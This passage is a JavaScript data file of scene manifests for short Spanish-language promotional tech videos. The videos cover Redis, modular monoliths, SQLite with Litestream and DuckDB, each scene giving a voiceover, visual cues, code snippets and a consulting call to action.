window.__BIBLIOTECA_2026__ = [
  {
    "key": "demo_redis",
    "topicNum": "00",
    "group": "00. DEMO ORIGINAL",
    "label": "Por qué Redis procesa 100K peticiones por segundo",
    "variation": "Demo",
    "category": "SISTEMAS & RENDIMIENTO",
    "manifest": {
      "title": "Por qué Redis procesa 100K peticiones por segundo",
      "fps": 30,
      "output": "C:\\Users\\Edixon\\Desktop\\VIDEO_REDIS_60S_FINAL.mp4",
      "scenes": [
        {
          "id": "scene_01_hook",
          "type": "kinetic_hook",
          "duration": 4,
          "voiceover": "¿Por qué Redis vuela mientras tu base de datos colapsa? Cien mil peticiones por segundo.",
          "visual_cue": "Entra texto cinético en muelle y rayo dorado",
          "props": {
            "badge": "ANÁLISIS DE SISTEMAS",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿POR QUÉ REDIS",
                "color": "#ffffff"
              },
              {
                "text": "VUELA?",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "100.000 PETICIONES POR SEGUNDO"
          }
        },
        {
          "id": "scene_02_bottleneck",
          "type": "metrics_comparison",
          "duration": 5,
          "voiceover": "El cuello de botella siempre es el disco. Una llamada al sistema NVMe tarda cincuenta mil nanosegundos.",
          "visual_cue": "Barra roja de disco se dispara hasta 50.000 ns",
          "props": {
            "badge": "EL PROBLEMA DE FONDO",
            "title": "EL CUELLO DE BOTELLA DEL DISCO",
            "itemA": {
              "name": "LATENCIA DISCO NVMe",
              "value": 50000,
              "max": 50000,
              "color": "#ef4444",
              "subtext": "50.000 ns POR LLAMADA AL SISTEMA"
            },
            "itemB": {
              "name": "LATENCIA OBJETIVO",
              "value": 1000,
              "max": 50000,
              "color": "#71717a",
              "subtext": "MÁXIMO TOLERADO EN ALTA CONCURRENCIA"
            },
            "speedup": "EL DISCO ES 50X DEMASIADO LENTO"
          }
        },
        {
          "id": "scene_03_ram_intro",
          "type": "kinetic_hook",
          "duration": 5.5,
          "voiceover": "El primer secreto: Redis elimina el disco por completo y opera cien por ciento en memoria RAM.",
          "visual_cue": "Aparece icono de memoria y texto verde 100% RAM",
          "props": {
            "badge": "SECRETO #1",
            "icon": "memory",
            "lines": [
              {
                "text": "CERO DISCO.",
                "color": "#ffffff"
              },
              {
                "text": "100% MEMORIA RAM.",
                "color": "#10b981"
              }
            ],
            "subtitle": "TIEMPO DE ACCESO: 80 NANOSEGUNDOS"
          }
        },
        {
          "id": "scene_04_memory_hex",
          "type": "memory_layout",
          "duration": 7,
          "voiceover": "Aquí lo ves en memoria real: punteros directos sin serializar y acceso físico en solo ochenta nanosegundos.",
          "visual_cue": "Tabla hexadecimal se ilumina mostrando punteros a RAM",
          "props": {
            "badge": "DEBUGGER DE MEMORIA",
            "title": "ACCESO DIRECTO A BYTES EN RAM",
            "rows": [
              {
                "addr": "0x7FFE0010",
                "hex": [
                  "72",
                  "65",
                  "64",
                  "69",
                  "73",
                  "5F",
                  "6B",
                  "76"
                ],
                "label": "KEY: \"redis_kv\""
              },
              {
                "addr": "0x7FFE0018",
                "hex": [
                  "00",
                  "00",
                  "00",
                  "08",
                  "7F",
                  "FE",
                  "00",
                  "40"
                ],
                "label": "POINTER -> DICT"
              },
              {
                "addr": "0x7FFE0020",
                "hex": [
                  "FF",
                  "00",
                  "C0",
                  "A8",
                  "01",
                  "0A",
                  "1F",
                  "90"
                ],
                "label": "CLIENT TCP FD"
              },
              {
                "addr": "0x7FFE0028",
                "hex": [
                  "01",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00",
                  "00"
                ],
                "label": "EXPIRE AT (TTL)"
              }
            ]
          }
        },
        {
          "id": "scene_05_myth_buster",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Multi-threading con hilos concurrentes? Falso. Redis corre en un solo hilo sin un solo lock.",
          "visual_cue": "Titular de mito se quiebra y entra 'ES UN SOLO HILO'",
          "props": {
            "badge": "EL GRAN MITO",
            "icon": "lightning",
            "lines": [
              {
                "text": "¿MULTI-THREADING?",
                "color": "#ffffff"
              },
              {
                "text": "ES UN SOLO HILO.",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "CERO LOCKS. CERO CONCURRENCIA BLOQUEANTE."
          }
        },
        {
          "id": "scene_06_arch_flow",
          "type": "architecture_flow",
          "duration": 7.5,
          "voiceover": "Usa multiplexación con epoll: diez mil clientes envían datos y el event loop atiende los eventos listos sin frenar jamás.",
          "visual_cue": "Diagrama de flujo activo: paquetes viajan por carriles a la cola",
          "props": {
            "header": "MULTIPLEXACIÓN I/O CON EPOLL",
            "nodes": [
              {
                "id": "clients",
                "label": "CLIENT CONCURRENT CONNS",
                "sublabel": "10.000 CONEXIONES ABIERTAS",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "eventloop",
                "label": "SINGLE-THREADED EVENT LOOP",
                "sublabel": "I/O MULTIPLEXING (ae_epoll.c)",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "storage",
                "label": "IN-MEMORY HASH TABLE",
                "sublabel": "O(1) AVERAGE LOOKUP TIME",
                "color": "#10b981",
                "y": 880
              }
            ],
            "queueSlots": 6
          }
        },
        {
          "id": "scene_07_code_c",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "En su código en C, epoll_wait captura los eventos y processCommand ejecuta la consulta en memoria al instante.",
          "visual_cue": "Editor de código resalta la línea processCommand en amarillo",
          "props": {
            "badge": "CÓDIGO FUENTE DE REDIS",
            "filename": "ae_epoll.c",
            "lang": "C",
            "codeLines": [
              {
                "text": "int numevents = epoll_wait(state->epfd, state->events, ...);",
                "highlight": false
              },
              {
                "text": "for (int j = 0; j < numevents; j++) {",
                "highlight": false
              },
              {
                "text": "    // Procesa eventos de sockets sin locks ni threads",
                "highlight": false
              },
              {
                "text": "    processCommand(c); // Ejecución inmediata en memoria",
                "highlight": true
              },
              {
                "text": "}",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "gcc -O3 -c ae_epoll.c",
              "output": "ae_epoll.o generated (zero overhead kernel bindings)"
            }
          }
        },
        {
          "id": "scene_08_benchmark",
          "type": "code_terminal",
          "duration": 7,
          "voiceover": "El benchmark oficial lo demuestra: ciento dieciocho mil operaciones por segundo con latencia sub-milisegundo.",
          "visual_cue": "Terminal ejecuta redis-benchmark con salida de rendimiento en vivo",
          "props": {
            "badge": "BENCHMARK EN VIVO",
            "filename": "benchmark.sh",
            "lang": "BASH",
            "codeLines": [
              {
                "text": "redis-server --port 6379 --daemonize yes",
                "highlight": false
              },
              {
                "text": "redis-benchmark -q -n 100000 -c 50 -P 16",
                "highlight": true
              },
              {
                "text": "echo \"BENCHMARK DE ALTA CONCURRENCIA FINALIZADO\"",
                "highlight": false
              }
            ],
            "terminal": {
              "command": "redis-benchmark -q -n 100000 -c 50 -P 16",
              "output": "SET: 118,483 req/sec (avg latency: 0.12ms)\nGET: 121,951 req/sec (avg latency: 0.09ms)\n100.00% <= 1 ms latency"
            }
          }
        },
        {
          "id": "scene_09_versus",
          "type": "metrics_comparison",
          "duration": 7.5,
          "voiceover": "Frente a los cuatro mil registros de una base SQL en disco, Redis rinde casi veinticinco veces más rápido.",
          "visual_cue": "Comparativa de barras en verde y bloque '24.6x MÁS RÁPIDO'",
          "props": {
            "badge": "COMPARATIVA FINAL",
            "title": "THROUGHPUT REAL MEDIDO",
            "itemA": {
              "name": "BASE DE DATOS SQL (DISCO)",
              "value": 4800,
              "max": 120000,
              "color": "#71717a",
              "subtext": "I/O SYSTEM CALL BOUND"
            },
            "itemB": {
              "name": "REDIS (RAM DIRECTA)",
              "value": 118500,
              "max": 120000,
              "color": "#10b981",
              "subtext": "IN-MEMORY ZERO-LOCK"
            },
            "speedup": "24.6x MÁS RÁPIDO"
          }
        },
        {
          "id": "scene_10_cierre",
          "type": "kinetic_hook",
          "duration": 5,
          "voiceover": "Lección de arquitectura: la RAM es el nuevo disco. Sígueme en SeDev para más ingeniería de sistemas.",
          "visual_cue": "Cierre con texto verde 'LA RAM ES EL NUEVO DISCO' y firma",
          "props": {
            "badge": "LECCIÓN DE INGENIERÍA",
            "icon": "speed",
            "lines": [
              {
                "text": "LA RAM ES",
                "color": "#ffffff"
              },
              {
                "text": "EL NUEVO DISCO.",
                "color": "#10b981"
              }
            ],
            "subtitle": "SEDEV: ARQUITECTURA DE SOFTWARE"
          }
        }
      ]
    }
  },
  {
    "key": "01_A",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var A (Técnico): Cómo estructurar un Monolito Modular sin código espagueti",
    "variation": "A (Técnico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Cómo estructurar un Monolito Modular sin código espagueti (Var A)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Tu monolito se volvió un monstruo inmanejable? El error no fue el monolito: fue no definir límites de dominio.",
          "visual_cue": "Gancho cinético de apertura con engranaje de arquitectura",
          "props": {
            "badge": "ARQUITECTURA 2026",
            "lines": [
              {
                "text": "EL GRAN REGRESO DEL",
                "color": "#ffffff"
              },
              {
                "text": "MONOLITO MODULAR",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "LÍMITES DE DOMINIO // UN SOLO BINARIO",
            "icon": "cpu"
          }
        },
        {
          "id": "problem",
          "type": "tradeoff_matrix",
          "duration": 5.5,
          "voiceover": "Partir tu app en veinte microservicios solo multiplicó la latencia de red y los fallos distribuidos.",
          "visual_cue": "Tabla comparativa mostrando la sobrecarga de microservicios vs monolito modular",
          "props": {
            "header": "DIAGNÓSTICO ARQUITECTÓNICO",
            "title": "EL COSTE OCULTO DE DISTRIBUIR",
            "subtitle": "LATENCIA DE RED VS LLAMADAS EN RAM",
            "colA": "MONOLITO MODULAR",
            "colB": "MICROSERVICIOS",
            "rows": [
              {
                "dim": "Llamadas internas",
                "a": "< 0.01ms (RAM)",
                "b": "15-40ms (HTTP)",
                "aGood": true
              },
              {
                "dim": "Transacciones",
                "a": "ACID Nativas",
                "b": "Saga Pattern (Frágil)",
                "aGood": true
              },
              {
                "dim": "Despliegues",
                "a": "1 Pipeline simple",
                "b": "15 Pipelines K8s",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "modules_arch",
          "type": "architecture_flow",
          "duration": 6,
          "voiceover": "Un monolito modular vive en un solo binario, pero sus módulos están aislados como si fueran cajas negras.",
          "visual_cue": "Diagrama de flujo mostrando módulos aislados: Auth, Billing y Inventory comunicándose por interfaces",
          "props": {
            "header": "ESTRUCTURA DE DOMINIO",
            "title": "LÍMITES ESTRICTOS EN MEMORIA",
            "nodes": [
              {
                "id": "api",
                "label": "API GATEWAY INTERNO",
                "sublabel": "Fastify / Axum Router",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "modules",
                "label": "DOMINIOS AISLADOS (DDD)",
                "sublabel": "Orders // Billing // Users (Zero cross-imports)",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "storage",
                "label": "POSTGRES TRANSACCIONAL",
                "sublabel": "Esquemas lógicos separados (Single DB)",
                "color": "#fbbf24",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "code_boundary",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "En código, prohibimos las importaciones directas entre módulos. Cada dominio expone una interfaz pública estricta.",
          "visual_cue": "Terminal mostrando TypeScript / Rust haciendo cumplir límites de módulos con ESLint / ArchUnit",
          "props": {
            "header": "ENFORCEMENT EN CI/CD",
            "title": "REGLAS DE IMPORTACIÓN STRICT",
            "filename": "packages/orders/domain.ts",
            "codeLines": [
              "// ❌ ERROR: Importación profunda prohibida",
              "import { PaymentModel } from \"@sedev/billing/internal\";",
              "",
              "// ✔ CORRECTO: Comunicación por interfaz pública",
              "import { BillingFacade } from \"@sedev/billing\";",
              "const invoice = await BillingFacade.charge(order.id);"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "acid_power",
          "type": "metrics_comparison",
          "duration": 5.5,
          "voiceover": "Lo mejor: conservas transacciones ACID completas. Si el pago falla, la orden se cancela sin dramas distribuidos.",
          "visual_cue": "Métricas de fiabilidad de transacciones: 100% consistencia vs eventual consistency",
          "props": {
            "header": "INTEGRIDAD DE DATOS",
            "metricA": {
              "label": "MICROSERVICIOS (SAGA)",
              "value": "84.2%",
              "sub": "Fallos de consistencia eventual",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOLITO MODULAR",
              "value": "100%",
              "sub": "Garantía ACID en una sola base",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta",
          "type": "tradeoff_matrix",
          "duration": 4.5,
          "voiceover": "Si tu equipo está atrapado en un laberinto de microservicios y quieres migrar a un monolito modular limpio, link en mi bio para auditar tu arquitectura.",
          "visual_cue": "Cierre con tarjeta de contacto y consultoría de arquitectura",
          "props": {
            "header": "CONSULTORÍA DE ARQUITECTURA",
            "title": "SIMPLIFICA TU CODEBASE",
            "subtitle": "REDUCE COSTES // MULTIPLICA VELOCIDAD",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA // SEDEV",
              "text": "¿Dudas con tu arquitectura? Enlace en mi perfil para agendar una sesión técnica."
            }
          }
        }
      ]
    }
  },
  {
    "key": "01_B",
    "topicNum": "01",
    "group": "01. MONOLITO MODULAR",
    "label": "Var B (Polémico): Por qué tu startup NO necesita microservicios",
    "variation": "B (Polémico)",
    "category": "ARQUITECTURA DE SOFTWARE",
    "manifest": {
      "title": "[01] Por qué tu startup NO necesita microservicios (Var B)",
      "category": "ARQUITECTURA DE SOFTWARE",
      "slug": "01_monolito_modular",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Tu startup tiene tres desarrolladores y diez microservicios. Están quemando el cincuenta por ciento de su tiempo manteniendo Kubernetes.",
          "visual_cue": "Gancho cinético agresivo de llamada de atención",
          "props": {
            "badge": "REALIDAD DE STARTUP",
            "lines": [
              {
                "text": "DEJA DE USAR",
                "color": "#ef4444"
              },
              {
                "text": "MICROSERVICIOS",
                "color": "#ffffff"
              }
            ],
            "subtitle": "COMPLEJIDAD ACCIDENTAL // VELOCIDAD CERO",
            "icon": "server_rack"
          }
        },
        {
          "id": "bill_compare",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Amazon Prime Video y Shopify consolidaron servicios para recortar el noventa por ciento de sus costes y latencias.",
          "visual_cue": "Doble terminal comparando factura mensual y tiempo de despliegue",
          "props": {
            "header": "EL COSTE DE LA MODA",
            "title": "KUBERNETES VS UN SOLO SERVIDOR",
            "subtitle": "DESPLIEGUE REAL EN PRODUCCIÓN",
            "termA": {
              "title": "STACK CON MICROSERVICIOS",
              "color": "#ef4444",
              "cmd": "kubectl get pods --all-namespaces",
              "status": "24 pods en ejecución // 8 clusters",
              "time": "$3,800/mes",
              "lines": [
                "Factura AWS EKS + NAT Gateways: $3,800",
                "Tiempo medio de debugging: 4 horas",
                "Tracing distribuido obligatorio con Jaeger"
              ]
            },
            "termB": {
              "title": "MONOLITO MODULAR CON KAMAL",
              "color": "#10b981",
              "cmd": "kamal deploy",
              "status": "1 solo binario en VPS dedicado",
              "time": "$120/mes",
              "lines": [
                "Factura servidor Hetzner: $120/mes",
                "Tiempo medio de deploy: 18 segundos",
                "Logs centralizados en stdout directos"
              ]
            }
          }
        },
        {
          "id": "verdict_b",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Los microservicios resuelven problemas de organización cuando tienes mil ingenieros, no de rendimiento técnico.",
          "visual_cue": "Matriz de tradeoffs demoledora",
          "props": {
            "header": "PRAGMATISMO TÉCNICO",
            "title": "¿CUÁNDO USAR CADA UNO?",
            "colA": "STARTUPS & PYMES",
            "colB": "BIG TECH (+500 DEVS)",
            "rows": [
              {
                "dim": "Arquitectura recomendada",
                "a": "Monolito Modular",
                "b": "Microservicios",
                "aGood": true
              },
              {
                "dim": "Tiempo a producción",
                "a": "1 semana",
                "b": "3 meses",
                "aGood": true
              },
              {
                "dim": "Mantenimiento DevOps",
                "a": "0 personas",
                "b": "Equipo dedicado",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_b",
          "type": "code_terminal",
          "duration": 5,
          "voiceover": "Si tu equipo pasa más tiempo arreglando pipelines que creando producto, audito tu arquitectura para volver a la simplicidad. Agenda en mi perfil.",
          "visual_cue": "Terminal de contacto con auditoría técnica",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA",
            "title": "DESMANTELA LA COMPLEJIDAD",
            "filename": "audit/contact.sh",
            "codeLines": [
              "# Diagnóstico de cuellos de botella y costes cloud",
              "sedev audit --target=microservices --strategy=consolidation",
              "✔ Retorno estimado: -75% costes y 5x velocidad de entrega",
              "# Agenda tu sesión técnica en el link de la bio."
            ],
            "cursorLine": 3
          }
        }
      ]
    }
  },
  {
    "key": "02_A",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var A (Técnico): 0ms de latencia: Arquitectura de SQLite embebido con Litestream",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & RENDIMIENTO",
    "manifest": {
      "title": "[02] 0ms de latencia: Arquitectura de SQLite embebido con Litestream (Var A)",
      "category": "BASES DE DATOS & RENDIMIENTO",
      "slug": "02_sqlite_produccion",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_sqlite",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Hacer consultas a tu base de datos con cero milisegundos de latencia de red? Es hora de hablar de SQLite en producción.",
          "visual_cue": "Gancho cinético con icono de base de datos ultraligera",
          "props": {
            "badge": "BASES DE DATOS 2026",
            "lines": [
              {
                "text": "SQLITE EN",
                "color": "#ffffff"
              },
              {
                "text": "PRODUCCIÓN",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "0MS DE RED // REPLICACIÓN CONTINUA",
            "icon": "sqlite_feather"
          }
        },
        {
          "id": "latency_gap",
          "type": "latency_scale",
          "duration": 6,
          "voiceover": "Cada vez que tu backend consulta PostgreSQL en AWS RDS, pierdes quince milisegundos en el cable de red. SQLite vive en el mismo proceso.",
          "visual_cue": "Escala logarítmica de hardware mostrando el abismo entre red y disco NVMe local",
          "props": {
            "header": "LATENCIA FÍSICA DE HARDWARE",
            "title": "EL ABISMO DE SALIR DEL PROCESO",
            "subtitle": "COMPARATIVA REAL DE TIEMPOS DE RESPUESTA",
            "tiers": [
              {
                "name": "RAM (DDR5)",
                "latency": "100 ns",
                "ratio": 0.1,
                "color": "#10b981",
                "human": "Instante"
              },
              {
                "name": "NVMe SSD LOCAL (SQLITE)",
                "latency": "0.1 ms",
                "ratio": 0.35,
                "color": "#38bdf8",
                "human": "0.1 milisegundos"
              },
              {
                "name": "AWS RDS NETWORK ROUND-TRIP",
                "latency": "18 ms",
                "ratio": 1,
                "color": "#ef4444",
                "human": "180x más lento"
              }
            ],
            "conclusion": "SQLite local responde antes de que el paquete TCP de Postgres salga del switch.",
            "conclusionSub": "Eliminas completamente la latencia de serialización y sockets de red."
          }
        },
        {
          "id": "litestream_stream",
          "type": "network_pipeline",
          "duration": 6,
          "voiceover": "¿Y los backups? Litestream replica cada transacción del WAL en milisegundos hacia un bucket S3 de forma transparente.",
          "visual_cue": "Diagrama de pipeline de datos: WAL local escribiendo a NVMe y streameando a S3",
          "props": {
            "header": "STREAMING REPLICATION",
            "title": "CERO PÉRDIDA DE DATOS CON LITESTREAM",
            "subtitle": "REPLICACIÓN CONTINUA DEL WRITE-AHEAD LOG",
            "stages": [
              {
                "id": "app",
                "label": "BACKEND APP (SQLITE WAL)",
                "sub": "Escrituras locales a 100K ops/s",
                "y": 220,
                "color": "#38bdf8",
                "metric": "0.05ms"
              },
              {
                "id": "litestream",
                "label": "LITESTREAM REPLICATOR",
                "sub": "Lee frames de WAL en background",
                "y": 520,
                "color": "#fbbf24",
                "metric": "10ms lag"
              },
              {
                "id": "s3",
                "label": "AMAZON S3 / CLOUDFLARE R2",
                "sub": "Respaldo inmutable geodistribuido",
                "y": 820,
                "color": "#10b981",
                "metric": "$0.50/mes"
              }
            ]
          }
        },
        {
          "id": "cta_sqlite",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu base de datos colapsa en picos de tráfico o estás saturando conexiones, realizo auditorías de latencia y arquitectura de datos. Enlace en mi bio.",
          "visual_cue": "Tarjeta final con oferta de auditoría de rendimiento en base de datos",
          "props": {
            "header": "AUDITORÍA DE DATOS & LATENCIA",
            "title": "OPTIMIZA TU CAPA DE DATOS",
            "subtitle": "SEDEV CONSULTING",
            "cta": {
              "badge": "AUDITORÍA DE BASES DE DATOS // SEDEV",
              "text": "¿Latencia alta o saturación en tu DB? Link en mi perfil para auditar tus queries y pools."
            }
          }
        }
      ]
    }
  },
  {
    "key": "02_B",
    "topicNum": "02",
    "group": "02. SQLITE PRODUCCION",
    "label": "Var B (Polémico): ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & RENDIMIENTO",
    "manifest": {
      "title": "[02] ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia (Var B)",
      "category": "BASES DE DATOS & RENDIMIENTO",
      "slug": "02_sqlite_produccion",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_sqlite_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Te dijeron que SQLite es solo un juguete para desarrollo. La verdad es que puede aguantar cincuenta mil peticiones por segundo en un VPS.",
          "visual_cue": "Gancho cinético retador",
          "props": {
            "badge": "DESMITIFICANDO SOFTWARE",
            "lines": [
              {
                "text": "¿SQLITE NO AGUANTA",
                "color": "#ffffff"
              },
              {
                "text": "PRODUCCIÓN?",
                "color": "#ef4444"
              }
            ],
            "subtitle": "EL MITO DE LA BASE DE DATOS DE JUGUETE",
            "icon": "database"
          }
        },
        {
          "id": "wal_mode",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con el modo WAL activado, los lectores nunca bloquean a los escritores y las lecturas son concurrentes y paralelas.",
          "visual_cue": "Terminal configurando PRAGMA journal_mode=WAL y synchronous=NORMAL",
          "props": {
            "header": "CONFIGURACIÓN DE PRODUCCIÓN",
            "title": "MODO WAL & CONCURRENCIA",
            "filename": "db/setup.sql",
            "codeLines": [
              "-- Activa escritura paralela sin bloqueo de lectores",
              "PRAGMA journal_mode = WAL;",
              "PRAGMA synchronous = NORMAL;",
              "PRAGMA busy_timeout = 5000;",
              "PRAGMA cache_size = -64000; -- 64MB RAM Cache",
              "-- Resultado: 50.000 lecturas/s por núcleo de CPU"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "benchmark_split",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Mientras Postgres gasta CPU manejando conexiones de red, SQLite procesa queries directamente en la memoria del kernel.",
          "visual_cue": "Benchmark en vivo comparando RPS y consumo de memoria",
          "props": {
            "header": "BENCHMARK DE CONCURRENCIA",
            "title": "WRK BENCHMARK // 10,000 CONCURRENT CLIENTS",
            "termA": {
              "title": "POSTGRESQL EN CLOUD RDS",
              "color": "#ef4444",
              "cmd": "wrk -t8 -c200 -d10s http://api/pg",
              "status": "Saturando pool de conexiones",
              "time": "4,200 req/s",
              "lines": [
                "Latencia p99: 42.1ms (Network queue)",
                "CPU al 85% en RDS micro",
                "Coste mensual estimado: $180"
              ]
            },
            "termB": {
              "title": "SQLITE EMBEDDED CON WAL",
              "color": "#10b981",
              "cmd": "wrk -t8 -c200 -d10s http://api/sqlite",
              "status": "Lectura directa de NVMe con page cache",
              "time": "52,400 req/s",
              "lines": [
                "Latencia p99: 0.8ms (Sub-milisegundo)",
                "CPU al 22% en VPS de $10",
                "Coste mensual: $10 (Hetzner VPS)"
              ]
            }
          }
        },
        {
          "id": "cta_sqlite_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu factura de base de datos se salió de control y quieres optimizar tu arquitectura, reviso tu stack técnico. Link en mi biografía.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA TÉCNICA DE BASES DE DATOS",
            "title": "REDUCE COSTES // ELEVA CONCURRENCIA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "¿Tu base de datos está lenta o cara? Agenda una auditoría técnica en el enlace del perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "03_A",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var A (Técnico): Procesamiento Columnar Vectorizado: 10M filas en milisegundos",
    "variation": "A (Técnico)",
    "category": "DATA ENGINEERING & ANALYTICS",
    "manifest": {
      "title": "[03] Procesamiento Columnar Vectorizado: 10M filas en milisegundos (Var A)",
      "category": "DATA ENGINEERING & ANALYTICS",
      "slug": "03_duckdb_analytics",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_duckdb",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo procesar diez millones de filas de analítica en tu laptop en medio segundo sin levantar un clúster de Spark? Con DuckDB.",
          "visual_cue": "Gancho cinético con icono columnar",
          "props": {
            "badge": "ANALÍTICA DE DATOS 2026",
            "lines": [
              {
                "text": "DUCKDB: EL SQLITE",
                "color": "#ffffff"
              },
              {
                "text": "DE LA ANALÍTICA",
                "color": "#fbbf24"
              }
            ],
            "subtitle": "PROCESAMIENTO COLUMNAR VECTORIZADO",
            "icon": "duckdb"
          }
        },
        {
          "id": "row_vs_col",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Las bases transaccionales leen filas enteras, desperdiciando caché de CPU. DuckDB lee solo las columnas que necesitas en vectores contiguos.",
          "visual_cue": "Comparación visual de layout de memoria: Row-oriented vs Columnar Vectorized",
          "props": {
            "header": "MEMORIA Y HARDWARE",
            "title": "ROW-STORE VS COLUMN-STORE",
            "items": [
              {
                "name": "POSTGRES (ROW-STORE)",
                "addr": "Heap Tuple: Lee todos los campos de disco",
                "value": "Desperdicio de CPU L3 Cache",
                "color": "#ef4444"
              },
              {
                "name": "DUCKDB (VECTORIZED)",
                "addr": "Vector Chunk: 2048 enteros contiguos",
                "value": "Aceleración SIMD directa en CPU",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "parquet_query",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Puedes consultar archivos Parquet directamente en Amazon S3 sin importar los datos. Solo descargas los bytes exactos que pide tu consulta.",
          "visual_cue": "Terminal ejecutando query SQL directa sobre s3://bucket/data.parquet",
          "props": {
            "header": "CONSULTA DIRECTA SOBRE PARQUET",
            "title": "ZERO-ETL ANALYTICS",
            "filename": "analytics/query.py",
            "codeLines": [
              "import duckdb",
              "# Lee 50GB de logs en S3 descargando solo 40MB de metadata",
              "res = duckdb.query(\"\"\"",
              "  SELECT user_country, SUM(amount_usd) ",
              "  FROM read_parquet(\"s3://logs-2026/*.parquet\")",
              "  GROUP BY 1 ORDER BY 2 DESC LIMIT 10;",
              "\"\"\").df()",
              "print(f\"Completado en {res.execution_time}ms\")"
            ],
            "cursorLine": 6
          }
        },
        {
          "id": "cta_duckdb",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu empresa gasta miles de dólares en Snowflake o BigQuery para consultas simples, audito tus costes de datos para migrar a motores in-process. Link en bio.",
          "visual_cue": "Cierre con llamado a auditoría de costes cloud de datos",
          "props": {
            "header": "AUDITORÍA DE COSTES CLOUD",
            "title": "REDUCE TU FACTURA DE ANALÍTICA",
            "cta": {
              "badge": "AUDITORÍA DE COSTES // SEDEV",
              "text": "¿Gastas fortunas en Snowflake o Databricks? Link en mi perfil para auditar tus pipelines."
            }
          }
        }
      ]
    }
  },
  {
    "key": "03_B",
    "topicNum": "03",
    "group": "03. DUCKDB ANALYTICS",
    "label": "Var B (Polémico): Snowflake es un desperdicio: Analítica in-process con Parquet",
    "variation": "B (Polémico)",
    "category": "DATA ENGINEERING & ANALYTICS",
    "manifest": {
      "title": "[03] Snowflake es un desperdicio: Analítica in-process con Parquet (Var B)",
      "category": "DATA ENGINEERING & ANALYTICS",
      "slug": "03_duckdb_analytics",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_duckdb_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Las empresas queman cinco mil dólares al mes en Snowflake para correr reportes que una máquina de diez dólares procesa en segundos con DuckDB.",
          "visual_cue": "Gancho cinético sobre costes en analítica",
          "props": {
            "badge": "DESTRUYENDO COSTES CLOUD",
            "lines": [
              {
                "text": "DEJA DE PAGAR",
                "color": "#ef4444"
              },
              {
                "text": "SNOWFLAKE",
                "color": "#ffffff"
              }
            ],
            "subtitle": "EL DESPILFARRO DE LOS DATA WAREHOUSES",
            "icon": "duckdb"
          }
        },
        {
          "id": "cost_split",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "El noventa por ciento de las empresas no tienen big data: tienen medium data que cabe perfectamente en la memoria de un solo servidor.",
          "visual_cue": "Doble terminal comparando factura mensual y tiempos de query",
          "props": {
            "header": "COMPARATIVA DE FACTURACIÓN",
            "title": "CLOUD DATA WAREHOUSE VS IN-PROCESS",
            "termA": {
              "title": "SNOWFLAKE / BIGQUERY CLUSTER",
              "color": "#ef4444",
              "cmd": "Warehouse XS Always-On + Storage fees",
              "status": "Créditos computacionales consumiéndose",
              "time": "$4,500/mes",
              "lines": [
                "Egress data transfer costs: $650",
                "Tiempo de arranque de warehouse: 8 segundos",
                "Lock-in de proveedor propietario"
              ]
            },
            "termB": {
              "title": "DUCKDB EMBEDDED + PARQUET EN S3",
